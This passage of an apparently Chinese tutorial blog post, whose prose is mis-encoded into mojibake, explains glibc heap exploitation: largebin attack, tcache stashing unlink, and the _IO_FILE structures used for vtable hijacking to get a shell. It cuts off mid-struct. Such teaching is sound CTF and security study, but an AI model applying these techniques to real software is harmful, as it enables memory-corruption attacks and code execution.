    <content type="html"><![CDATA[<h1 id="Â∫è"><a href="#Â∫è" class="headerlink" title="Â∫è"></a>Â∫è</h1><p>ÂâçÊÆµÊó∂Èó¥Áªô‰∫∫ËÆ≤ËØæÔºåÁ¢∞‰∏ä‰∫ÜÈ´òÁâàÊú¨glibcÂ†ÜÂà©Áî®ËøôÈÉ®ÂàÜ„ÄÇÂàöÂ•ΩËá™Â∑±Âï•‰πü‰∏ç‰ºöÔºå‰∫éÊòØËä±‰∫Ü‰∫õÊó∂Èó¥Â•ΩÂ•ΩÂ≠¶‰∫Ü‰∏ãIOFILEÂú®È´òÁâàÊú¨‰∏ãÁöÑÂà©Áî®„ÄÇÂ•ΩÂú®ÊúÄÂêéÊ≤°ÊúâÁøªËΩ¶ÔºåËá™Â∑±Âú®Â§áËØæÊúüÈó¥‰πüÁã¨Á´ãÂÆåÊàê‰∫Ü‰∏Ä‰∫õÁªèÂÖ∏‰æãÈ¢òÔºåÁÆóÊòØÊúâ‰∫Ü‰∏Ä‰∫õÁ≤óÊµÖÁöÑÊî∂Ëé∑„ÄÇÁé∞‰ª•‰∏Ä‰∏™ÂàùÂ≠¶ËÄÖÁöÑÁõÆÂÖâÈáçÊñ∞Ê¢≥ÁêÜÂ≠¶‰π†IOFILEÂà©Áî®ÁöÑÊï¥‰∏™ËøáÁ®ã„ÄÇ</p><h1 id="ËæÖÂä©ÊâãÊ≥ï"><a href="#ËæÖÂä©ÊâãÊ≥ï" class="headerlink" title="ËæÖÂä©ÊâãÊ≥ï"></a>ËæÖÂä©ÊâãÊ≥ï</h1><p>IOFILEÁöÑÂà©Áî®ÔºåÈÄöÂ∏∏ÈúÄË¶Å‰º™ÈÄ†IOFILEÁªìÊûÑ‰ΩìÔºåÈöèÂêéÈÄöËøá‰∏Ä‰∫õÊñπÂºèËß¶ÂèëIOÊµÅÔºå‰ΩøÂæóÁ®ãÂ∫èË∞ÉÁî®Êàë‰ª¨Âä´ÊåÅÂêéÁöÑIOÂáΩÊï∞Ôºå‰ªéËÄåËææÊàêgetshellÊàñËÄÖorw„ÄÇÊâÄ‰ª•IOFILE exploitÂÆûÈôÖ‰∏äÊòØÊï¥‰∏™Âà©Áî®ÁéØËäÇÁöÑ<strong>ÊúÄÂêé‰∏ÄÊ≠•</strong>ÔºåË¶ÅËææÊàê‰º™ÈÄ†IOFILEÁªìÊûÑ‰Ωì„ÄÅËß¶ÂèëIOÈìæÔºåÂæÄÂæÄÈúÄË¶ÅÂÄüÂä©‰∏Ä‰∫õ<strong>ËæÖÂä©ÊâãÊ≥ï</strong>„ÄÇ</p><p>Âú®È´òÁâàÊú¨‰∏ãÔºåÊúÄ‰∏∫Â∏∏Áî®ÁöÑÊòØ<strong>largebin attack</strong>ÔºåËØ•ÊâãÊ≥ïÈúÄË¶Å‰∏Ä‰∏™UAFÔºåËææÊàêÂêéËÉΩÂú®‰ªªÊÑèÁõÆÊ†áÂú∞ÂùÄÂÜô‰∏äÂ†ÜÂú∞ÂùÄÔºåÁÆÄÂçïÊö¥ÂäõÔºåÁî®ËøáÈÉΩËØ¥Â•Ω„ÄÇËøòÊúâ<strong>tcache poisoning</strong>ÔºåÁî®Êù•ÂàÜÈÖçÂà∞‰ªªÊÑèÂú∞ÂùÄ‰∏ä„ÄÇËøòÊúâ‰∏ÄÁßçÊòØ<strong>tcache stashing unlink</strong>ÔºåËØ•ÊâãÊ≥ïÂú®house of pig‰∏≠Ë¢´‰ΩøÁî®ÔºåË¶ÅÊ±ÇÁ®ãÂ∫è‰ΩøÁî®callocÔºåÂπ∂Â≠òÂú®UAFÔºåÈÄöÂ∏∏ÁªìÂêàlargebin attackËææÊàêÂ∞ÜÁõÆÊ†áÂú∞ÂùÄÂàÜÈÖç‰∏∫chunk„ÄÇ</p><h2 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h2><blockquote><p>ÂéüÂÖàÂ≠òÂú®‰∏§Êù°Âà©Áî®ÈìæÔºåÂÖ∂‰∏≠‰∏ÄÊù°Âú®È´òÁâàÊú¨‰∏ãÂ∑≤Ë¢´Â∞ÅÁ¶ÅÔºåÊü•ÊâæËµÑÊñôÊó∂ÈúÄÁîÑÂà´„ÄÇ</p></blockquote><p>È¶ñÂÖàÊàë‰ª¨ÈúÄË¶Å‰∫ÜËß£largebinÁöÑÁªìÊûÑÔºö</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811162248700.png" alt="image-20230811162248700"></p><p>‰∏Ä‰∏™large bin‰∏≠ÂåÖÂê´<strong>‰∏ÄÂÆöËåÉÂõ¥Â§ßÂ∞è</strong>ÁöÑlarge chunkÔºåÂ¶ÇÁ¨¨‰∏Ä‰∏™largebinÂ§ßÂ∞èËåÉÂõ¥‰∏∫(0x400-0x430)ÔºåÁ¨¨‰∫å‰∏™‰∏∫(0x440-0x470)„ÄÇÂêå‰∏Ä‰∏™bin‰∏≠ÔºåÁõ∏ÂêåÂ§ßÂ∞èÁöÑchunk‰πãÈó¥Áî®<code>fd</code>„ÄÅ<code>bk</code>Áõ∏ËøûÔºå‰∏çÂêåÂ§ßÂ∞èÁî®<code>fd_nextsize</code>„ÄÅ<code>bk_nextsize</code>Áõ∏ËøûÔºå‰∏îËá™Âä®Áî±Â§ßÂà∞Â∞èÊéíÂ∫èÔºåÂ¶Ç‰∏äÂõæ‰∏≠Â∑¶ËæπÁöÑÂ§ß‰∫éÂè≥Ëæπ„ÄÇ</p><p>ÂΩìÊúâÊñ∞ÁöÑchunkÂä†ÂÖ•largebinÔºå‰∏îÂ§ßÂ∞èÂ∞è‰∫éËØ•bin‰∏≠Â∑≤ÊúâÁöÑchunkÊó∂Ôºå‰ºöËøõË°åÂ¶Ç‰∏ãÊìç‰ΩúÔºàÁ≤æÁÆÄÁâàÔºâÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);</span><br><span class="line"><span class="comment">/*Êü•ÊâæËØ•sizeÂ±û‰∫éÁöÑbinËåÉÂõ¥ÔºåËøîÂõûindex*/</span></span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line"><span class="comment">/*ÂèñÂæóbin*/</span></span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="comment">//critical1!!!</span></span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//critical2!!!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËØ•Êìç‰ΩúÂÆûÈôÖ‰∏äÂÆåÊàê‰∫Ü‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂ∞ÜchunkÂä†ÂÖ•ÂèåÂêëÈìæË°®ÁöÑËøáÁ®ãÔºåÂèØ‰ª•ÈÄêÊ≠•ÊâãÂä®Ê®°ÊãüÂä†Ê∑±ÁêÜËß£</p><p>ËØ•Êìç‰ΩúÁº∫Â§±ÂØπÂèåÂêëÈìæË°®ÂÆåÊï¥ÊÄßÁöÑÊ£ÄÊü•ÔºåÂèØ‰ª•Âä†‰ª•Âà©Áî®</p><p>Êàë‰ª¨ÂÅáËÆælargebin‰∏≠‰ªÖÂ≠òÂú®chunk0ÔºåÁé∞Âú®ÂáÜÂ§áÂ∞Üchunk1Âä†ÂÖ•largebinÔºå‰∏îchunk0 &gt; chunk1„ÄÇÊàë‰ª¨Êäächunk0ÁöÑ<code>bk_nextsize</code>‰øÆÊîπ‰∏∫<code>[target-0x20]</code>(Âç≥<code>target</code>ÁõÆÊ†áÂú∞ÂùÄ‰Ωç‰∫é‰ª•<code>[target-0x20]</code>ÂºÄÂ§¥ÁöÑchunkÁöÑ<code>fd_nextsize</code>Â§Ñ)</p><p>‰øÆÊîπÂÆåÊàêÂêéÔºåÊàë‰ª¨Â∞Üchunk1ÂÖ•ÈìæÔºåÈáçÁÇπÂÖ≥Ê≥®‰∏äËø∞‰ª£Á†ÅÁâáÊÆµ‰∏≠Ê≥®ÈáäÁöÑÈÉ®ÂàÜ„ÄÇcritical1Â§Ñ <code>victim-&gt;bk_nextsize = (&amp;target)-4)</code>Ôºåcritical2Â§Ñ <code>(&amp;target)-4)-&gt;fd_nextsize = victim</code>ÔºåÂç≥<code>*target = victim</code>„ÄÇÁõÆÊ†áËææÊàê</p><p>Áî±Ê≠§ÂèØËßÅÔºålargebin attackÁöÑÂà©Áî®Áõ∏ÂΩìÁÆÄÂçïÔºåÂè™ÈúÄ‰∏Ä‰∏™UAFÂç≥ÂèØÂÆå</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>ÂøòÂÜô‰∫ÜXD</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><p>glibcÂä†ÂÖ•tcacheÂêéÔºåÂΩì‰ªésmallbin‰∏≠ÂèñÂá∫chunkÊó∂ÔºåÂ¶ÇÊûúsmallbin‰∏≠‰ªçÊúâchunk‰∏îÂØπÂ∫îtcacheÊú™Â°´Êª°ÔºåÂàô‰ºöÂ∞Üsmallbin‰∏≠Ââ©‰ΩôchunkÂÖ®ÈÉ®‰æùÊ¨°ÊîæÂÖ•ÂØπÂ∫îtcache‰∏≠„ÄÇËÄåÂú®ËØ•ËøáÁ®ã‰∏≠ÔºåÂè™ÂØπ‰ªésmallbin‰∏≠ÂèñÂá∫ÁöÑchunkËøõË°å‰∫ÜÂÆåÊï¥ÊÄßÊ£ÄÊü•ÔºåÂêéÁª≠chunkÂùáÊ≤°Êúâ„ÄÇËØ•ÊâãÊ≥ïÂàôÂà©Áî®‰∫ÜËøô‰∏ÄÊºèÊ¥û„ÄÇ</p><p>‰ª•‰∏ã‰∏∫Â∞Üsmallbin‰∏≠chunkÊîæÂÖ•tcacheÁöÑ‰ª£Á†ÅÁâáÊÆµÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="comment">//Âè™ÂØπÁ¨¨‰∏Ä‰∏™chunkËøõË°å‰∫ÜÂÆåÊï¥ÊÄßÊ£ÄÊü•ÔºåÂêéÈù¢ËøõÂÖ•Âæ™ÁéØÔºåÊó†Ê£ÄÊü•</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// Ëé∑Âèñ small bin ‰∏≠ÂÄíÊï∞Á¨¨‰∫å‰∏™ chunk „ÄÇ</span></span><br><span class="line">bck = tc_victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br><span class="line"><span class="comment">//Â∞ÜÂÖ∂ÊîæÂÖ•Âà∞Tcache‰∏≠</span></span><br><span class="line">tcache_put (tc_victim, tc_idx);</span><br></pre></td></tr></table></figure><p>ÂÅáËÆæsmallbin‰∏≠Âè™Â≠òÂú®‰∏§‰∏™chunkÔºåÂÖàÂÖ•ÁöÑ‰∏∫chunk0ÔºåÂêéÂÖ•ÁöÑ‰∏∫chunk1ÔºåÊ†πÊçÆsmallbinÁöÑ<strong>FIFO</strong>ÂéüÂàôÔºåÂèñÂá∫Êó∂ÂÖàÂèñÂá∫chunk0</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811170105495.png" alt="image-20230811170105495"></p><p>ÂêåÊó∂‰ª§ÂØπÂ∫îÂ§ßÂ∞èÁöÑtcache‰∏≠Â∑≤Â°´ÂÖ•5‰∏™chunk</p><p>Ê≠§Êó∂Â∞Üchunk1ÁöÑ<code>bk</code>‰Ωç‰øÆÊîπ‰∏∫ÁõÆÊ†áÂú∞ÂùÄ<code>target</code>Ôºà‰∏çÁ†¥Âùè<code>fd</code>ÔºâÔºåÂπ∂Âà©Áî®ÂÖ∂‰ªñÊâãÊ≥ï‰ΩøÂæó<code>[target+0x8]</code>Â§Ñ‰∏∫‰∏Ä‰∏™ÊåáÂêë<strong>ÂèØÂÜôÂÜÖÂ≠ò</strong>ÁöÑÊåáÈíà„ÄÇÊää<code>target</code>Áúã‰Ωú‰∏Ä‰∏™chunkÁöÑÁî®Êà∑ÊåáÈíàÔºåÂàô<code>[target+0x8]</code>‰∏∫<code>bk</code>‰Ωç„ÄÇÊ≠§Â§Ñ‰ª§ÂÖ∂ÂèØÂÜôÊòØÂõ†‰∏∫ËøõË°åËØ•ÊîªÂáªÊó∂‰ºöÂêëËØ•ÊåáÈíàÊåáÂêëÁöÑÂú∞ÂùÄÂ§ÑÂÜô‰∏Ä‰∏™ÂÄºÔºåÂ¶ÇÊûú‰∏çÂèØÂÜôÁöÑËØùÁ®ãÂ∫è‰ºöÊä•Èîô„ÄÇÁî®largebin attackÂ∞ÜÊ≠§Â§ÑË¶ÜÁõñ‰∏∫ÂèØÂÜôÁöÑÂ†ÜÂú∞ÂùÄÊòØ‰∏ÄÁßçÂ∏∏ËßÅÊìç‰Ωú</p><p>Ê≠§Êó∂ÔºåÊàë‰ª¨Áî®<code>calloc</code>ÂáΩÊï∞Â∞Üchunk0Áî≥ËØ∑Âá∫Êù•„ÄÇ<code>calloc</code>ÂÖ∑ÊúâË∑≥ËøátcacheÁî≥ËØ∑chunkÁöÑÊÄßË¥®ÔºåÊâÄ‰ª•Ê≠§Â§ÑÂè™ËÉΩÁî®<code>calloc</code>„ÄÇ‰πãÂêéchunk1‰ºöÂä†ÂÖ•tcacheÔºåchunk1ÁöÑbkÊåáÂêëÁöÑ<code>target</code>‰πü‰ºöÂä†ÂÖ•tcache„ÄÇÂ¶ÇÊûúÊàë‰ª¨‰ΩøÁî®<code>malloc</code>ÔºåÊ†πÊçÆtcache <strong>LIFO</strong>ÁöÑÊÄßË¥®ÔºåÂ∞±ËÉΩÂ∞Ü<code>target</code>Áî≥ËØ∑Âá∫Êù•„ÄÇ</p><h1 id="IOFILEÂèäÁõ∏ÂÖ≥ÁªìÊûÑ"><a href="#IOFILEÂèäÁõ∏ÂÖ≥ÁªìÊûÑ" class="headerlink" title="IOFILEÂèäÁõ∏ÂÖ≥ÁªìÊûÑ"></a>IOFILEÂèäÁõ∏ÂÖ≥ÁªìÊûÑ</h1><h2 id="IO-FILE-PLUS"><a href="#IO-FILE-PLUS" class="headerlink" title="_IO_FILE_PLUS"></a>_IO_FILE_PLUS</h2><p>Á®ãÂ∫èÂú®ËøõË°å<strong>IOÊìç‰Ωú</strong>Êó∂Ôºå‰ºöÁî®Âà∞IOFILEÁõ∏ÂÖ≥ÁöÑÁªìÊûÑ„ÄÇ‰æãÂ¶Ç‰ºóÊâÄÂë®Áü•ÁöÑ<code>stdin</code>„ÄÅ<code>stdout</code>„ÄÅ<code>stderr</code>ÔºåÈÉΩÊòØÊåáÂêëIOÁªìÊûÑ‰ΩìÁöÑÊåáÈíà„ÄÇÂΩìÊâìÂºÄ‰∏Ä‰∏™Êñá‰ª∂Êó∂ÔºåÁ®ãÂ∫èÈúÄË¶ÅËÆ∞ÂΩïÊñá‰ª∂ÁöÑËæìÂÖ•ËæìÂá∫ÁºìÂÜ≤Âå∫Á≠âÂÜÖÂÆπÔºå‰∫éÊòØÈúÄË¶Å‰∏Ä‰∏™<code>_IO_FILE</code>ÁªìÊûÑ‰ΩìËøõË°åËÆ∞ÂΩï„ÄÇÈô§Ê≠§‰πãÂ§ñÔºåÂØπÊñá‰ª∂ËøõË°åÁöÑÂêÑÁßçÊìç‰ΩúÂΩ¢Êàê‰∫Ü‰∏ÄÂº†Âº†ÂáΩÊï∞ËôöË°®ÔºåÊñá‰ª∂ÈúÄË¶Å‰∏Ä‰∏™ÊåáÈíàËÆ∞ÂΩïÂØπÂ∫îÁöÑÂáΩÊï∞ËôöË°®ÔºåËØ•ÊåáÈíàË¢´ÂÆö‰πâ‰∏∫<code>_IO_jump_t</code>Á±ªÂûã„ÄÇ<code>_IO_FILE</code> ÁªìÊûÑ‰ΩìÂíåËôöË°®ÊåáÈíà<code>_IO_jump_t</code>ÂΩ¢Êàê‰∫Ü‰∏Ä‰∏™Áß∞‰∏∫<code>_IO_FILE_plus</code>ÁöÑÁªìÊûÑ‰ΩìÔºåÂÆÉÁöÑÂÆö‰πâÊòØËøôÊ†∑ÁöÑÔºö</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Â∏∏ËßÅÁöÑ<code>_IO_FILE_plus</code>ÁªìÊûÑ‰ΩìÊúâ<code>_IO_2_1_stderr</code>„ÄÅ<code>_IO_2_1_stdout</code>„ÄÅ<code>_IO_2_1_stdin</code>ÔºåÂâçÈù¢ÊèêÂà∞ÁöÑ<code>stdin</code>Á≠âÂ∞±ÊòØÊåáÂêëËøô‰∫õÂØπÂ∫î<code>_IO_FILE_plus</code>ÁªìÊûÑ‰ΩìÁöÑÊåáÈíà</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811172846782.png" alt="image-20230811172846782"></p><p>ÂèØ‰ª•ÈÄöËøágdbÁöÑ<code>p</code>Êåá‰ª§Êü•Áúã</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173045845.png" alt="image-20230811173045845"></p><p>Ê≠§Â§ñÔºåÂ≠òÂú®‰∏Ä‰∏™ÊåáÂêë<code>_IO_FILE_plus</code>ÁªìÊûÑ‰ΩìÁöÑ<code>_IO_list_all</code>ÊåáÈíàÔºåÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÊåáÂêë<code>_IO_2_1_stderr</code></p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173332086.png" alt="image-20230811173332086"></p><p>ÊØè‰∏™<code>_IO_FILE</code>ÁªìÊûÑ‰Ωì‰∏≠ÈÉΩÂ≠òÂú®‰∏Ä‰∏™<code>_chain</code>ÊåáÈíàÔºåÊåáÂêë‰∏ã‰∏Ä‰∏™<code>_IO_FILE_plus</code>ÁªìÊûÑ‰Ωì„ÄÇÈÄöÂ∏∏ÊÉÖÂÜµÔºåË°®Á§∫Â¶Ç‰∏ãÔºö</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811173606405.png" alt="image-20230811173606405"></p><p>ÂΩìÊúâÊñ∞Êñá‰ª∂Ë¢´ÊâìÂºÄÊó∂ÔºåÂØπÂ∫îÁöÑ<code>_IO_FILE_plus</code>ÁªìÊûÑ‰ΩìÂ∞±‰ºöË¢´ÊèíÂÖ•Âà∞<strong>ÈìæÈ¶ñ</strong>„ÄÇ</p><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>‰ª•‰∏ãÊòØ<code>_IO_FILE</code>ÁªìÊûÑ‰ΩìÁöÑÊ∫êÁ†ÅÔºåÁúãËµ∑Êù•ÂèØËÉΩÊúâ‰∫õÂ§¥Â§ßÔºåÈáçÁÇπÈúÄË¶Å‰∫ÜËß£ÁöÑÊòØÂá†‰∏™<strong>ÁºìÂÜ≤Âå∫ÁöÑÊåáÈíà</strong>„ÄÅ<code>_chain</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The tag name of this struct is _IO_FILE to preserve historic</span></span><br><span class="line"><span class="comment">   C++ mangled names for functions taking FILE* arguments.</span></span><br><span class="line"><span class="comment">   That name should not be used in new code.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE_complete</code>ÂèØ‰ª•ÁêÜËß£‰∏∫<code>_IO_FILE</code>ÁöÑË±™ÂçéÂä†ÈïøÁâàÔºåÂÖ∂‰∏≠ÁöÑ<code>_wide_data</code>ÈúÄË¶ÅÂÖ≥Ê≥®‰∏Ä‰∏ãÔºåÊúâ‰∫õÊâãÊ≥ï‰ºöÁî®Âà∞„ÄÇ</p><h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p><code>vtable</code>ÊòØ‰∏Ä‰∏™ÊåáÂêë<code>_IO_jump_t</code>ÁªìÊûÑ‰ΩìÁöÑÊåáÈíà„ÄÇÂΩìÊâìÂºÄ‰∏Ä‰∏™Êñá‰ª∂Êó∂ÔºåÁõ∏Â∫îÁöÑ <code>_IO_FILE</code> ÁªìÊûÑ‰Ωì‰ºöË¢´ÂàõÂª∫ÔºåÂπ∂Â∞ÜÂÖ∂<code> vtable</code> Â≠óÊÆµÊåáÂêëÂØπÂ∫îÊñá‰ª∂Á±ªÂûãÁöÑ <code>_IO_jump_t</code> ÁªìÊûÑ‰ΩìÁöÑÂú∞ÂùÄ„ÄÇËøôÊ†∑ÔºåÂΩìÈúÄË¶ÅÊâßË°åÊñá‰ª∂Êìç‰ΩúÊó∂ÔºåÂèØ‰ª•ÈÄöËøá <code>_IO_FILE</code> ÁªìÊûÑ‰Ωì‰∏≠ÁöÑ <code>vtable</code> Â≠óÊÆµËé∑ÂèñÂà∞Áõ∏Â∫îÁöÑ <code>_IO_jump_t</code> ÁªìÊûÑ‰ΩìÔºåÂπ∂ÈÄöËøáÂÖ∂‰∏≠ÁöÑÂáΩÊï∞ÊåáÈíàË∞ÉÁî®Áõ∏Â∫îÁöÑÊñá‰ª∂Êìç‰ΩúÂáΩÊï∞„ÄÇ</p><p>ÈÄöÂ∏∏Ôºå‰∏Ä‰∏™<code>_IO_jump_t</code> ÁªìÊûÑ‰ΩìÂåÖÂê´‰ª•‰∏ãÂáΩÊï∞ÊåáÈíà</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, 